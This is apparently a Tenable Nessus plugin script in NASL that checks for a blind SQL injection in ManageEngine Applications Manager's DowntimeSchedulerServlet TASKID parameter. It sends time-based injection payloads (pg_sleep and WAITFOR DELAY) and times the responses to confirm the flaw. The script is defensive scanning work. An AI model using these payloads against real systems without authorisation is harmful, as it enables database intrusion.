#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(84241);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/06/18 13:42:57 $");

  script_bugtraq_id(74692);
  script_osvdb_id(122202);

  script_name(english:"ManageEngine Applications Manager DowntimeSchedulerServlet 'TASKID' Blind SQLi");
  script_summary(english:"Attempts to exploit SQL injection vulnerability.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web application is affected by a blind SQL injection
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host is running a version of ManageEngine Applications
Manager that is affected by a blind SQL injection vulnerability due to
improper validation of user-supplied input to the 'TASKID' parameter
in the 'DowntimeSchedulerServlet' servlet. A remote attacker can
exploit this flaw to execute arbitrary SQL statements.

Note that some third-party resources indicate that a patch exists for
this vulnerability. However, Tenable Research has successfully
exploited this vulnerability in the latest available software release.");
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-15-229/");
  script_set_attribute(attribute:"solution", value:
"No patched version currently exists.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date",value:"2015/05/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/06/17");
  
  script_set_attribute(attribute:"plugin_type",value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:manageengine:applications_manager");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015 Tenable Network Security, Inc.");

  script_dependencies("manageengine_applications_manager_detect.nasl");
  script_require_keys("installed_sw/ManageEngine Applications Manager");
  script_require_ports("Services/www", 9090);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");
include("url_func.inc");

app = "ManageEngine Applications Manager";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:9090);

timings = make_list(1,3,5);
variance = 1;
max_queries = 8;

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
dir = dir - "/index.do";

cmds = make_list(
  "SELECT%20pg_sleep%28%TIMING%%29", # postgresql
  "WAITFOR%20DELAY%20%2700:00:%TIMING%%27" # MS SQL Server
);

install_url = build_url(port:port, qs:dir);

exploit = dir + '/servlet/DowntimeScheduler?action-method=delete&TASKID=-1;';

res = http_send_recv3(
  method : "GET",
  port   : port,
  item   : exploit,
  exit_on_fail : TRUE
);

if('response-code="3111"' >!< res[2] || "AppManager-response" >!< res[2])
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);

backend_cmd = NULL;
num_queries = NULL;

timing = 4;
# Find backend
foreach cmd (cmds)
{
  http_set_read_timeout(timing*max_queries+variance);
  cmd1 = ereg_replace(pattern:"%TIMING%",replace:timing,string:cmd);

  then = unixtime();
  res = http_send_recv3(
    method : "GET",
    port   : port,
    item   : exploit + cmd1,
    exit_on_fail : TRUE
  );

  now = unixtime();

  if('response-code="3111"' >!< res[2] || "AppManager-response" >!< res[2])
    continue;

  delta = now - then;

  if(delta >= timing)
  {
    backend_cmd = cmd;
    num_queries = delta/timing;
    break;
  }
}

if(isnull(backend_cmd))
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);

output = '';

cmd = '';
# Verify injection by testing other timings
foreach timing (timings)
{
  http_set_read_timeout(timing*max_queries+variance);
  cmd = ereg_replace(pattern:"%TIMING%",replace:timing,string:backend_cmd);

  then = unixtime();
  res = http_send_recv3(
    method : "GET",
    port   : port,
    item   : exploit + cmd,
    exit_on_fail : TRUE
  );
  now = unixtime();

  query_delta = (now-then) / num_queries;

  # Cool extra info to put in the report.  Only info from last loop iteration gets
  # included in report.
  # I put this before the audit so it can be displayed for debugging purposes as well
  output = 'Blind SQL Injection Results' +
           '\n  Response time                  : ' + (now-then) + ' secs' +
           '\n  Number of times query executed : ' + num_queries +
           '\n  Time per query                 : ' + query_delta + ' secs' +
           '\n  Query                          : ' + urldecode(estr: cmd);

  if(query_delta < timing || query_delta > timing + variance)
    audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
}

security_report_v4(
  port        : port,
  severity    : SECURITY_HOLE,
  request     : make_list(build_url(port:port, qs: exploit+cmd)),
  output      : res[2],
  rep_extra   : output,
  sqli        : TRUE,
  generic     : TRUE
);

exit(0);
